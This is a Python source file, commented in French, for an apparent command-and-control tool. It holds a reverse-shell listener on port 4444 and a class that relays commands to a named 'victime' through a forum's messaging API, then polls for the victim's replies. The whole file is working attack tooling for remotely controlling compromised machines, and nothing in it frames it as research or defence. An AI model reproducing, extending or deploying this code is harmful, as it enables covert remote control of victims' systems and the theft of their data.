import socket
import threading
import time
import requests
import subprocess

HOST = '0.0.0.0'  # Écoute toutes les interfaces
PORT = 4444


class Shell:
    def __init__(self, port):
        self.port = port
        self.command_lock = threading.Lock()

    def listen(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((HOST, self.port))
        self.server.listen(1)

        print(f"[+] En attente de connexion sur le port {self.port}...")
        self.client_socket, self.client_address = self.server.accept()
        print(f"[+] Connexion reçue de {self.client_address}")
        return True

    def execute(self, command, timeout_seconds=None):
        with self.command_lock:
            previous_timeout = self.client_socket.gettimeout()
            if timeout_seconds is not None:
                self.client_socket.settimeout(timeout_seconds)

            try:
                self.client_socket.sendall(command.encode())
                result = self.client_socket.recv(4096).decode(errors='ignore')
                return result
            finally:
                self.client_socket.settimeout(previous_timeout)

    def break_connection(self):
        self.client_socket.close()
        self.server.close()


class Forum:
    def __init__(self, ip, port, user, password, name_victime):
        self.ip = ip
        self.port = port
        self.user = user           # compte utilisé pour poster (ex: C2)
        self.password = password
        self.find = False
        self.num_commande = 1
        self.name = name_victime   # nom de la victime (ex: victime_2)
        self.command_lock = threading.Lock()

        # dernier message connu
        self.last = {'body': 'vide', 'id': 0, 'username': 'C2'}

    def generate_user_key(self):
        response = requests.post(
            f"http://{self.ip}:{self.port}/api/auth/login",
            json={"username": self.user, "password": self.password},
        )
        response.raise_for_status()
        return response.json()["token"]

    def execute(self, commande, timeout_seconds=None):
        with self.command_lock:
            self.find = False
            token = self.generate_user_key()
            start_time = time.time()

            response = requests.get(
                f"http://{self.ip}:{self.port}/api/messages",
                headers={"Authorization": f"Bearer {token}"},
            )
            messages = response.json()
            # On prend le dernier message de la victime AVANT d'envoyer la commande
            last_victim_id = max((m.get("id", 0) for m in messages if m.get("username") == self.name), default=0)

            print(f"[DEBUG] Dernier message de {self.name} avant envoi: ID={last_victim_id}")

            tagged = f"[FROM={self.user}];[TO={self.name}];[SEQ={self.num_commande}]; {commande}"
            requests.post(
                f"http://{self.ip}:{self.port}/api/messages",
                headers={"Authorization": f"Bearer {token}"},
                json={"body": tagged},
            )

            print(f"[DEBUG] Commande envoyée, attente de réponse avec ID > {last_victim_id}")

            while not self.find:
                response = requests.get(
                    f"http://{self.ip}:{self.port}/api/messages",
                    headers={"Authorization": f"Bearer {token}"},
                )
                messages = response.json()

                for message in messages:
                    mid = message.get("id", 0)
                    if message.get("username") == self.name and mid > last_victim_id:
                        self.last = message.copy()
                        print(f"[DEBUG] Nouveau message trouvé de {self.name}: ID={mid}")
                        self.find = True
                        break

                if self.find:
                    break

                if timeout_seconds is not None and time.time() - start_time >= timeout_seconds:
                    self.num_commande += 1
                    return "Erreur: timeout en attente de la reponse forum"

                print("not find, attente 1s...")
                time.sleep(1)

            try:
                parts = self.last['body'].split("];")
                if len(parts) < 4:
                    self.num_commande += 1
                    return None

                from_part = parts[0]
                to_part = parts[1]
                seq_part = parts[2]
                cmd_part = "];".join(parts[3:]).strip()

                sender = from_part.split("=", 1)[1].rstrip("]")
                target = to_part.split("=", 1)[1].rstrip("]")
                seq = seq_part.split("=", 1)[1].rstrip("]")

                print(f"[DEBUG] Message décodé: FROM={sender}, TO={target}, SEQ={seq}")

                if sender != self.name or target != self.user:
                    print(f"[WARN] Message ignoré: mauvais émetteur/destinataire")
                    self.num_commande += 1
                    return "pas-trouve"

                if int(seq) != self.num_commande:
                    print(f"[WARN] Séquence incorrecte: attendu {self.num_commande}, reçu {seq}")

                self.num_commande += 1
                return cmd_part

            except Exception as e:
                print(f"[ERROR] Erreur lors du parsing: {e}")
                self.num_commande += 1
                return "probleme"

